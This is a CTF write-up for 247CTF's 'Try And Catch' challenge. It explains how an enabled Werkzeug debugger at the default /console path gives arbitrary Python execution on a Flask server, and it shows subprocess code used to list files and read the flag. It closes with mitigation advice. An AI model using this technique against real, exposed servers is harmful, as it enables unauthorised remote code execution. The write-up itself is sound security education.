# 247CTF "Try And Catch"
A writeup for 247CTF's "Try and Catch" challenge.

This challenge is a great showcase of what can happen when a developer does not disable/remove features that were never intended to be included with production build software.

## Tools used:
- Debian 11
- Firefox ESR (for interface with the webapp)
- Atom (for easy viewing/editing of Python scripts)
- Terminator (for installing and navigating through Python modules)

## The challenge:

![challenge](https://user-images.githubusercontent.com/92492482/190871980-0840a1a9-b7f3-488b-9970-892196535845.png)

We start off in a plaintext file that is the source code for the app we will be exploiting in this challenge.

![target_app](https://user-images.githubusercontent.com/92492482/190872004-3be6a474-0c78-47e0-b9c4-ad15ed88f89f.png)

A quick glance over the source code gleans that:
- The app is written in Python.
- The app is a [Flask](https://pythonbasics.org/what-is-flask-python/) WSGI web app:
```python
from flask import Flask, request
```
- Appending `/calculator` to the URL will run the app instead of showing it's source:
```python
@app.route('/calculator')
```
- The app is using the [Werkzeug](https://werkzeug.palletsprojects.com/en/2.2.x/) WSGI library and the debugger for that library is turned on:
```python
from werkzeug.debug import DebuggedApplication
```
...
```python
app.wsgi_app = DebuggedApplication(app.wsgi_app, True)
```
...
```python
if __name__ == "__main__":
    app.run(debug=True)
```

We could try to mess with the input of the calculator function to get an exception, but there is error handling present and we would have to trigger an exception other than a Value or Type error to get an unmanaged exception instead of the `safe_cast()` function just returning a None type object:
```python
def safe_cast(val, to_type):
    try:
        return to_type(val)
    except (ValueError, TypeError):
        return None
```

If we can't get arround `safe_cast()`'s error handling, the None type object returned from `safe_cast()` will signal the `flag()` function to simply give us a message about the exception through `flag()`'s `return` and we won't ever get the exception from the debugger:
```python
if None in (number_1, number_2, operation) or not operation in calculate:
        return "Invalid calculator parameters"
```

Instead of having to fight with `safe_cast()`'s sanitized input and error handling, we can just try to get access to the debugger's console directly and use it to help us produce an exception.

We noted earlier the debugger was left enabled and a quick look at [this page](https://werkzeug.palletsprojects.com/en/2.2.x/debug/) from Werkzeug's documentation provides us with a good indicator that we are on the right track:

![danger](https://user-images.githubusercontent.com/92492482/190875292-d2df541b-c99b-4b10-9db1-52c3feeb6241.png)

What this cautionary message tells us is if we get access to the debugger console we can execute arbitrary code on the server, so we probably wont even have to trigger an exception to get the flag, and can instead look for it on the server's file system (more on this below)

We want to look over Werkzeug's code to find out more about how the debugger works as the documentation only shows ways of interaction through the source code.
We can install Werkzeug using pip:

![pip](https://user-images.githubusercontent.com/92492482/190876152-d410d797-45e5-4aa1-842f-06c416d9cf11.png)

To find out where pip has stored Werkzeug's module files we can use the Python interpreter to print out the contents of `sys.path`, which is the object Python uses to store various paths that are important to the Python installation:

![pip_werkzeug](https://user-images.githubusercontent.com/92492482/190876534-1ced9e2c-48d7-4103-aa0d-9af12cc12915.png)

We are interested in the `__init__.py` inside the debug directory:

![werkzeug_files](https://user-images.githubusercontent.com/92492482/190876779-9506f38d-f7d6-497f-a801-7e460a86e375.png)

We can see in a comment at the top of the `DebuggedApplication()` class that there is a variable for a default URL path to the console:
```python
class DebuggedApplication:
    """Enables debugging support for a given application::"""
```
...
```python
""":param console_path: the URL for a general purpose console."""
```

If we scroll further down to where the variables are defined in the class we see `console_path` is by default set to `/console`:
```python
def __init__(
        self,
        app: "WSGIApplication",
        evalex: bool = False,
        request_key: str = "werkzeug.request",
        console_path: str = "/console",
        console_init_func: t.Optional[t.Callable[[], t.Dict[str, t.Any]]] = None,
        show_hidden_frames: bool = False,
        pin_security: bool = True,
        pin_logging: bool = True,
```

Appending `/console` to the end of the site's URL, as if it were another application route like the `/calculator`, provides a Python interpreter prompt!

![console](https://user-images.githubusercontent.com/92492482/190878137-886d4835-8b51-4334-a8fd-c5c917657787.png)

We can use this prompt to execute Python code on the machine hosting the app.
Let's start by figuring out where we are currently in the file system and what files are in our current working directory.
We can run the `ls` command using the subprocess module, and redirect it's output to a `print()` function:
```python
import subprocess;
command = subprocess.Popen(['ls'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
stdout,stderr = command.communicate();
print(stdout)
```

Note that when using the Python interpreter, you can shorten your code to down to one line by using semi-colons to indicate to Python where new 'lines' should start. Python code used in this write up is formatted as multi-line for easier reading, but was input to the interpreter as a single line string.

`ls` shows us there is a `flag.txt` file in our directory:

![command1](https://user-images.githubusercontent.com/92492482/190877913-ddaae118-67c9-4e12-bfc1-46df689bb660.png)


We can now open the file as text and display it using another `print()` function:
```python
flag = open("./flag.txt", "rt");
print(flag.read())
```

# 🥳 Flag obtained! 🎉

![command2](https://user-images.githubusercontent.com/92492482/190878136-996a361d-8c56-4edf-8843-d8b8233c5964.png)

# Summary
The vulnerability we exploited in this challenge was Arbitrary Code Execution. This particular CTF was not difficult for me because I'm familiar with Python, but I decided to make a write up for it anyways because it was a fun challenge and it shows how security in place (the `safe_cast()` function being the security as it provides a sanitized input and would have prevented us from accessing the debugger by handling exceptions we could have thrown with some malformed input) was esentially rendered useless by allowing us access to the debugger console.

To mitigate this type of attack the developer could have disabled the debugger console for production builds.
Furthermore, the Werkzeug documentation highly recommends developers set a pin to authenticate with before being allowed access to a debug console to help prevent this type of scenario from happening.
